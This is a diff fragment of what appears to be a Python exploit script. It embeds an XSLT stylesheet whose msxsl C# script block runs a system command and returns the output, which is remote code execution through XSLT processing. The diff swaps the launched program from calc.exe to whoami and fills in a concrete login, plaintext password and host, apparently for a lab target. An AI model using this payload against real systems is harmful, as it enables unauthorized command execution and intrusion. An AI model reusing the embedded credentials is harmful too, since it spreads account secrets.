@@ -25,15 +25,15 @@ xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-micros
 xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">\
 <msxsl:script language="C#" implements-prefix="csharp_user">public string xml() \
 { string cmd = ""; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
- proc.StartInfo.FileName = "calc.exe"; proc.StartInfo.Arguments = cmd;\
+ proc.StartInfo.FileName = "whoami"; proc.StartInfo.Arguments = cmd;\
  proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \
  proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \
  </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/>\
  </xsl:template> </xsl:stylesheet> ';
 
-login = "XXXX;
-password="XXXX";
-host = "XXXX";
+login = "mark@relia.com";
+password="OathDeeplyReprieve91";
+host = "http://web02.relia.com";
 
 # Step 1 - Get Main page
 s = requests.session()
